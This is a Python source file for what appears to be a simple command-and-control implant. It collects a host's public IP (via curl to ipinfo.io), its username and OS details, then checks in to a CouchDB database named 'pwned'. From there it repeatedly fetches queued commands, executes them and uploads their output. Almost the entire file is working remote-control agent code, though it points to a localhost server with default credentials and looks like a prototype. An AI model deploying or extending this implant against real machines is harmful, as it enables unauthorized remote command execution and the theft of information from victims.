import json
import couchdb
from pydantic import BaseModel
from datetime import datetime
from fastapi.encoders import jsonable_encoder
import subprocess
import os
from time import sleep
import sys

class Json_Format(BaseModel):
    agent_id: int
    OS: str
    ip: str
    user: str
    completed_commands: list
    pending_commands:list

    enslaved_time: datetime

class Slave(object):
    username = "admin"
    passw = "admin"
    server_addr = "127.0.0.1:5984"

    def gather_info(self):
        result = subprocess.run(["curl","ipinfo.io"],capture_output=True)
        self.ip = result.stdout.decode("utf-8")
        result = subprocess.run(["whoami"],capture_output=True)
        self.user = result.stdout.decode("utf-8")
        result = subprocess.run(["uname","-a"],capture_output=True)
        self.os = result.stdout.decode("utf-8")

        '''
        self.ip = subprocess.run(["curl","ipinfo.io/ip"])
        self.ip = self.ip.stdout
        self.user = subprocess.run(["whoami"])
        self.user = self.user.stdout
        self.os = subprocess.run(["uname","-a"])
        self.os = self.os.stdout
        '''

    def connect_db(self):
        self.couchserver = couchdb.Server("http://{}:{}@{}".format(self.username,self.passw,self.server_addr))
        if (self.couchserver):
            print("Connection Success")
            self.db = self.couchserver['pwned']
            if (self.db):
                print("Connected to pwned DB...Ready to send initial check in")

    def initial_check_in(self):
        self.init_checkin = Json_Format(agent_id=123, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now())
        self.init_checkin = jsonable_encoder(self.init_checkin)
        print(self.init_checkin)
        print(type(self.init_checkin))
        self.doc_id, self.doc_rev = self.db.save((self.init_checkin))
        print("checked in")
        print(self.doc_id,self.doc_rev)

    def check_for_commands(self):
    # meant to be looped to check for pending commands
        #self.doc = dict(self.db[self.doc_id])
        doc = dict(self.db[self.doc_id])
        print(doc)
        rev = doc['_rev']
        #pending.append(self.doc['pending_commands'][0])
        if not doc['pending_commands']:
            print("no command found")
            return
        cmd = doc['pending_commands'][0]
        print(cmd)
        cmd_list = cmd.split(" ")
        print(cmd_list)
        result = subprocess.run(cmd_list,capture_output=True)
        print(result.stdout.decode("utf-8"))
        cmd_result = result.stdout.decode("utf-8")
        #doc['completed_commands'] 
        doc['completed_commands'].append({cmd:cmd_result})
        for x in doc['pending_commands']:
            if x == cmd:
                doc['pending_commands'].remove(cmd)
        print(doc)
        self.doc_id, self.doc_rev = self.db.save(doc)

    def main(self):
        slave = Slave()
        slave.gather_info()
        slave.connect_db()
        slave.initial_check_in()
        while True:
            sleep(10)
            slave.check_for_commands()
            ask = input("continue? y/n")
            if ask == "y":
                sys.exit(0)



if __name__ == "__main__":
    Slave().main()